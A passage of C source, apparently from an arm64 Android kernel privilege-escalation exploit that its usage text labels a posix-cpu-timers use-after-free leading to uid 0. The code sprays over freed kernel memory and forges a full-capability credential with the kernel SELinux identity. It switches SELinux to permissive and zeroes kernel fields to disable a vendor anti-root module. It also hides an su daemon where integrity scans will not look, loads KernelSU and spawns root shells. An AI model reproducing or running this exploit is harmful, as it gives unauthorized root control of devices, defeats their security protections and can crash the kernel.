{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/* Final stage: hand off to the privileged child. */
static void write_ksu_script(void)
{
    static const char script[] =
        "#!/system/bin/sh\n"
        "set -u\n"
        "TRACE=/data/local/tmp/ksu-trace.log\n"
        "km() {\n"
        "    message=\"[$(date +%H:%M:%S)] $*\"\n"
        "    echo \"$message\"\n"
        "    if [ \"${KSU_RUNNER_DEBUG:-0}\" = 1 ]; then echo \"$message\" >> \"$TRACE\"; sync; fi\n"
        "}\n"
        "module_live() { grep -q '^kernelsu .* Live ' /proc/modules; }\n"
        "if module_live; then\n"
        "    echo KSU_LOADED\n"
        "    echo 1 > /sys/fs/selinux/enforce\n"
        "    exit 0\n"
        "fi\n"
        "KSLIDE=$(cat /data/local/tmp/ksu_slide 2>/dev/null | tr -d ' \\r\\n')\n"
        "[ -n \"$KSLIDE\" ] && [ -x /data/local/tmp/ksupatch ] &&\n"
        "[ -x /data/local/tmp/insmodf ] && [ -s /data/local/tmp/kernelsu.ko ] || {\n"
        "    km 'self-data prerequisites missing; no module inserted'\n"
        "    exit 1\n"
        "}\n"
        "rm -f /data/local/tmp/kernelsu-p.ko || exit 1\n"
        "km \"function binding start (slide=$KSLIDE; no facts file)\"\n"
        "/data/local/tmp/ksupatch \"$KSLIDE\" /data/local/tmp/kernelsu.ko /data/local/tmp/kernelsu-p.ko || {\n"
        "    km 'function binding failed; no module inserted'\n"
        "    exit 1\n"
        "}\n"
        "km 'candidate insmodf start'\n"
        "echo '[ksu] direct insmodf (self-data candidate, flags=0):'\n"
        "/data/local/tmp/insmodf /data/local/tmp/kernelsu-p.ko 0 allow_shell=1\n"
        "rc=$?\n"
        "km \"candidate insmodf rc=$rc\"\n"
        "if [ \"${KSU_RUNNER_DEBUG:-0}\" = 1 ]; then dmesg 2>/dev/null | tail -60; fi\n"
        "if [ \"$rc\" -eq 0 ] && module_live; then\n"
        "    echo KSU_LOADED\n"
        "    echo 1 > /sys/fs/selinux/enforce\n"
        "    km \"candidate live; enforce=$(getenforce)\"\n"
        "    exit 0\n"
        "fi\n"
        "echo KSU_MISSING\n"
        "km 'candidate failed; original diagnostic SELinux state retained; no generic fallback'\n"
        "exit 1\n"
        ;
    int fd = open("/data/local/tmp/ksu_stage.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0)
        return;
    (void)!write(fd, script, sizeof(script) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        /* Retry on any failure. A burst-miss holds the previous victim's
         * zombie (safe: it is never reaped), so a fresh plant is still valid. */
        logf("[-] stage %s attempt=%d failed, retrying\n", what, attempt);
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        sched_yield();
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xffffffc000000000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xffffffc000000000) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xffffffc000000000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    g_slide = site0 - STATIC_TIMER_SITE;

    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            unsigned long long page = V & ~0x1fffULL;
            unsigned long long *c = (unsigned long long *)(payload + off);
            size_t blob = 0, cand[] = {0x1f00, 0x1000, 0x1800, 0x800,
                                       0x100, 0x0};
            int fit = 0;

            if (off + 0xb8 > 0x2000)
            {
                logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                     tag, off);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > 0x2000)
                    continue;
                if (b + 0x40 <= off || off + 0xb8 <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            build_payload(payload, off, V + 0x78, target);
            /* c[0]=A (usage), c[1]=uid/gid will be dirtied by rb erase,
             * c[2]=suid/sgid = target, both fixed by later zero plants. */
            c[3] = 0; /* euid/egid */
            c[4] = 0; /* fsuid/fsgid */
            c[5] = 0; /* securebits */
            for (int i = 6; i <= 10; i++)
                c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
            *(unsigned long long *)(payload + off + 0x80) =
                page + blob; /* security */
            *(unsigned long long *)(payload + off + 0x88) =
                ROOT_USER_STATIC + g_slide;
            *(unsigned long long *)(payload + off + 0x90) =
                INIT_USER_NS_STATIC + g_slide;
            *(unsigned long long *)(payload + off + 0x98) =
                INIT_UCOUNTS_STATIC + g_slide;
            *(unsigned long long *)(payload + off + 0xa0) =
                INIT_GROUPS_STATIC + g_slide;
            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                SELINUX_SID_KERNEL;
            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
                SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
                 tag, off, blob, page + blob);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
             "recs=%d slab_own=%d/32 base=%#llx\n",
             tag, V, V + 0x78, pfn, slab_pfn, g_slide, nrec, slab_own,
             g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        return;
    }
    atomic_store(&g_burst, 1);
    /*
     * Phase 1 is already spraying.  When the victim page is freed, release
     * phase 2 immediately; detecting the free before the allocation would
     * otherwise leave the page to the next caller.
     */
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    if (!hit)
    {
        /* A miss means a system allocation won the freed victim page, so the
         * kernel's uncontrolled rb_erase already wrote into an unrelated
         * object. Retrying inside this run keeps touching the damaged state
         * and wedges the kernel (reap hang -> watchdog reset). Park instead:
         * the caller's retry starts a FRESH process on a calmer system, which
         * is the pattern proven to land. */
        logf("[-] plant%d burst missed; holding zombie -- parking\n", tag);
        g_held++;
        park_forever("burst miss");
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode, NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin",
                    g_debug_logging ? (char *)"KSU_RUNNER_DEBUG=1" : (char *)"KSU_RUNNER_DEBUG=0", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    logf("[child0] wait_child_main entry pid=%d\n", getpid());
    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    logf("[child1] hello sent, waiting for go\n");
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);
    logf("[child2] go received, reading creds\n");

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child3] uid=%d euid=%d\n", rep.uid, rep.euid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    /* Effective root is what grants capabilities; accept euid==0 even if the
     * real-uid word write raced. The shell below still runs as euid 0. */
    if (rep.euid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child euid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        pid_t w;

        (void)write(4, &rep, sizeof(rep));
        close(4);

        /* The fake cred carries the kernel SID, so set SELinux permissive from
         * userspace (clean 1-byte write) instead of zeroing 8 bytes of kernel
         * memory. Verify + retry: the su socket needs permissive to work. */
        for (int try = 0; try < 4; try++)
        {
            int enforce = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
            if (enforce >= 0)
            {
                (void)write(enforce, "0", 1);
                close(enforce);
            }
            {
                char buf[8] = {0};
                int r = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
                if (r >= 0)
                {
                    (void)read(r, buf, sizeof(buf) - 1);
                    close(r);
                }
                if (buf[0] != '1')
                    break;
            }
            usleep(20000);
        }
        logf("[fake] permissive write done\n");
        /* OOS7: snapshot diagnostics first (hkd_capture_diag), then arm
         * the BPF kallsyms_lookup_name program and poll for the parent's
         * kptr_restrict zero.  The helper is the one un-hooked consumer
         * of module kallsyms on this kernel: the guard evaluates the
         * mask at open time (held-fd trick is dead) but the helper
         * checks kallsyms_show_value(current_cred) LIVE at each call.
         * Once the window opens, resolve the guard's $d anchors, post
         * the .bss/.data bases, and hold until the parent cleared the
         * hooks (late load stays denied otherwise). */
        if (HKD_ENABLED)
        {
            hkd_capture_diag();
            hkd_child_stage();
        }
        /* NOTE: do NOT commit a real cred here (setresuid/setresgid). The
         * commit path panics the kernel while the task's cred is the fake
         * page one. The uid/gid word may stay rb-dirtied; euid 0 + full caps
         * keep every operation working regardless. */

        logf("[fake] child uid=%d euid=%d; forking su daemon\n",
             rep.uid, rep.euid);
        write_ksu_script();
        w = fork();
        if (w == 0)
        {
            char *const av[] = {(char *)"su", (char *)"--daemon", NULL};

            setsid();
            /* Put su under the APEX virt bin (a fresh tmpfs) instead of
             * /data/local/tmp, so no su binary lingers in a Play
             * Integrity-scanned location. */
            (void)mount("tmpfs", "/apex/com.android.virt/bin", "tmpfs", 0,
                        "mode=0755,size=8m");
            if (copy_file("/data/local/tmp/tempshell/su",
                          "/apex/com.android.virt/bin/su") == 0 ||
                copy_file("/data/local/tmp/tsud",
                          "/apex/com.android.virt/bin/su") == 0)
            {
                (void)chmod("/apex/com.android.virt/bin/su", 0755);
                chcon_system("/apex/com.android.virt/bin/su");
                execve("/apex/com.android.virt/bin/su", av, envp);
            }
            execve("/data/local/tmp/tempshell/su", av, envp);
            execve("/data/local/tmp/tsud", av, envp);
            _exit(127);
        }
        /* The daemon is a FALLBACK root provider only (kept in case the
         * module load below fails); do not wait on it here. */
        logf("[fake] su daemon pid=%d detached\n", w);

        /*
         * 64560-style finalize (2026-10-31): run the KSU stage inline from
         * this rooted child — permissive window -> ksud late-load ->
         * module verification -> SELinux BACK TO ENFORCING -> report.
         * Mirrors the CVE-2026-64560 chain's transactional finale
         * (ksu-open/ksu-close) instead of leaving the system permissive
         * with a manual late-load step.  If the mid-handshake "K" attempt
         * already loaded the module, the script's guard makes this a
         * fast no-op (KSU_LOADED + enforce restore only).
         */
        {
            int listed = run_ksu_stage_worker("finalize");

            /* If the module is up, the kernel-module su (/system/bin/su,
             * u:r:ksu:s0) replaces the socket daemon: terminate it for a
             * clean, 64560-like post-success state. On failure, leave it
             * running as the fallback root path for this boot. */
            if (listed)
            {
                logf("[fake] KernelSU Live; stopping fallback daemon "
                     "%d (module su takes over)\n", w);
                kill(w, SIGTERM);
            }
            else
            {
                logf("[fake] module not listed; fallback daemon %d "
                     "kept\n", w);
            }
        }
        _exit(0);
    }

    /*
     * Direct-cred path: the parent has already zeroed uid/gid/euid/egid/
     * fsuid/fsgid (and cleared vr.ko's tag). If euid is already 0 we must NOT
     * call setuid(0)/setresgid(0): they re-enter commit_creds, re-tag the task,
     * and vr.ko's sys_exit probe kills us. Fall back to the setuid path only if
     * euid is somehow still non-zero.
     */
    if (rep.euid == 0)
    {
        rep.setuid_ret = 0;
        rep.setuid_errno = 0;
        logf("[child] already euid=0: skipping setuid/setresgid (vr.ko bypass)\n");
    }
    else
    {
        logf("[child] euid=%d != 0: falling back to setuid path\n", rep.euid);
        errno = 0;
        {
            long sg = syscall(SYS_setresgid, 0, 0, 0);

            logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
        }
        errno = 0;
        rep.setuid_ret = (int)syscall(SYS_setuid, 0);
        rep.setuid_errno = errno;
        logf("[child] setuid(0) ret=%d errno=%d\n",
             rep.setuid_ret, rep.setuid_errno);
    }
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] resuid=%d/%d/%d setuid_ret=%d errno=%d\n",
         rep.ruid, rep.reuid, rep.rsuid, rep.setuid_ret, rep.setuid_errno);
    if (rep.reuid != 0)
    {
        logf("[-] euid != 0 after escalation; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

/* One zero-write plant to `target` (rb_erase writes 8 bytes of 0), with retries
 * and per-attempt logging. Returns 0 on success, -1 on failure. */
static int zero_write(unsigned long long target, const char *what,
                      unsigned char *raw)
{
    struct plant_res r;

    for (int a = 1; a <= 3; a++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] zero-write %s target=%#llx attempt=%d/3\n",
             what, target, a);
        run_plant(target, 1, 0, &r, raw);
        if (r.ok)
        {
            logf("[+] zero-write %s OK (attempt %d)\n", what, a);
            return 0;
        }
        if (a < 3)
            logf("[-] zero-write %s attempt=%d failed, retrying\n", what, a);
    }
    logf("[-] zero-write %s FAILED after 3 attempts\n", what);
    return -1;
}

/* vivo vr.ko anti-root. Zero the whole thread_info.flags word (clears the
 * 0x400 syscall-tracepoint work bit AND tag byte A), then zero the 8-byte
 * slot at task+0x28 which covers tag byte B (0x2c): vr kills any task whose
 * tag pair is out of sync. The 0x28 write stays inside thread_info
 * (0x00-0x2f) so __state at 0x30 is untouched. No SIGSTOP freeze; clearing
 * the 0x400 bit first closes the race instead. */
static void defeat_vr(unsigned long long task, unsigned char *raw, pid_t child)
{
    (void)child;
    if (!is_kernel_ptr(task))
    {
        logf("[-] vr de-tag: bad task=%#llx, skipped\n", task);
        return;
    }
    logf("[+] vr de-tag: task=%#llx, zeroing flags + tagB slot\n", task);
    zero_write(task + 0x00, "vr-flags", raw);
    zero_write(task + 0x28, "vr-tagB", raw);
    /* Globally disable vr's sys_exit kill path: the sys_exit tracepoint's
     * iterator NULL-checks funcs (cbz in the reference disasm), so clearing
     * the pointer is safe and keeps vr's termination probe from firing for
     * ANY task -- the KernelSU helpers spawned later included. */
    zero_write(TP_SYS_EXIT_STATIC + g_slide + TRACEPOINT_FUNCS_OFF,
               "vr-sys-exit-funcs", raw);
    logf("[+] vr de-tag done (tags A+B cleared, sys_exit kill disabled)\n");
}

static void usage(const char *prog)
{
    unsigned i;

    printf("CVE-2026-98260 posix-cpu-timers UAF -> uid 0  (arm64)\n");
    printf("supported kernels:\n");
    for (i = 0; i < sizeof(g_targets) / sizeof(g_targets[0]); i++)
        printf("  %s*\n", g_targets[i].prefix);
    printf("\nusage: %s <mode> [args]\n\n", prog);
    printf("modes:\n");
    printf("  (default)      verify: zero cred uid/gid fields -> uid 0 shell (u:r:shell:s0)\n");
    printf("  verify         same as default (prints ROOT_SHELL_OK on success)\n");
    printf("  shell          interactive root shell (shell-domain, bounding-set caps only)\n");
    printf("  fake           full-capability fake cred + SELinux off + KernelSU late-load\n");
    printf("  leak           leak child cred + task only, then exit (no escalation)\n");
    printf("  ids            discover tracefs event ids only, then exit\n");
    printf("  cpu <n>        pin to CPU <n>  (e.g. %s cpu 2 shell)\n", prog);
    printf("  wait <m>       internal child mode (not for direct use)\n");
    printf("  --help | -h    this help\n");
    printf("\nnotes:\n");
    printf("  - run as shell (uid 2000) with /sys/kernel/tracing access\n");
    printf("  - REBOOT is the only clean cleanup (parks zombies / SELinux permissive)\n");
}

static int pick_target(void)
{
    struct utsname u;
    unsigned i;

    if (uname(&u))
    {
        logf("[-] uname failed\n");
        return -1;
    }
    for (i = 0; i < sizeof(g_targets) / sizeof(g_targets[0]); i++)
    {
        size_t n = strlen(g_targets[i].prefix);

        if (!strncmp(u.release, g_targets[i].prefix, n))
        {
            g_t = &g_targets[i];
            if (!g_t->static_timer_site || !g_t->selinux_state_static ||
